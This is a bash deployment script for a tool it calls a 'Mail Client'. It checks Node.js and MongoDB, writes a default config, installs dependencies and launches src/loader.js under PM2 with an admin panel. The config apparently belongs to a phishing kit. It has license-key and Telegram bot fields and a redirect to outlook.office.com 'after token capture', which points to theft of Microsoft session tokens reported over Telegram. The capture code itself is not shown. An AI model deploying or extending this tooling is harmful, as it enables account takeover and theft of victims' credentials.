#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 Mail Client Setup & Start"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Check Node.js
if ! command -v node &> /dev/null; then
    echo "❌ Node.js not installed!"
    echo "   Install: https://nodejs.org/"
    exit 1
fi
echo "✅ Node.js $(node -v)"

# Check MongoDB
echo "📊 Checking MongoDB..."
if ! command -v mongod &> /dev/null; then
    echo "❌ MongoDB not installed!"
    echo "   Install: https://www.mongodb.com/docs/manual/installation/"
    exit 1
fi

if ! systemctl is-active --quiet mongod 2>/dev/null && ! pgrep -x mongod > /dev/null; then
    echo "⚠️  Starting MongoDB..."
    sudo systemctl start mongod 
2>/dev/null || sudo mongod --fork --logpath /var/log/mongodb.log
    sleep 2
fi
echo "✅ MongoDB running"
echo ""

# Create config.js if it doesn't exist
if [ ! -f "config.js" ]; then
    echo "⚠️  config.js not found, creating default..."
    cat > config.js << 'EOF'
// Mail Client Configuration
module.exports = {
  // License Key (activated through admin panel on first run)
  licenseKey: '',

  // Server Port
  port: 8080,

  // MongoDB Connection
  mongodbUri: 'mongodb://localhost:27017/mail_client',

  // Telegram Notifications (Optional)
  telegramBotToken: '',
  telegramChatId: '',

  // Redirect URL (where users go after token capture)
  redirectUrl: 'https://outlook.office.com'
};
EOF
    echo "   ✅ config.js created with defaults"
    echo "   📝 Edit config.js later to add your license key & telegram settings"
    echo ""
fi

# Install dependencies
echo "📦 Installing dependencies..."
npm install --omit=dev --silent
echo "✅ Dependencies installed"
echo ""

# Install PM2 if not present
if ! command -v pm2 &> /dev/null; then
    echo "📦 Installing PM2..."
    npm install -g pm2 --silent
fi

# Stop existing PM2 process
echo "🛑 Stopping existing mail-client..."
pm2 delete mail-client 2>/dev/null || true
echo ""

# Start with PM2
echo "🚀 Starting Mail Client..."
pm2 start src/loader.js --name mail-client
pm2 save

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Mail Client Running!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

SERVER_IP=$(hostname -I | awk '{print $1}')

echo "🌐 Access Points:"
echo "   Local:       http://localhost:8080"
echo "   Network:     http://$SERVER_IP:8080"
echo "   Admin Panel: http://$SERVER_IP:8080/admin"
echo ""
echo "📋 Commands:"
echo "   • Logs:     pm2 logs mail-client"
echo "   • Stop:     pm2 delete mail-client"
echo "   • Restart:  pm2 restart mail-client"
echo "   • Status:   pm2 status"
echo ""
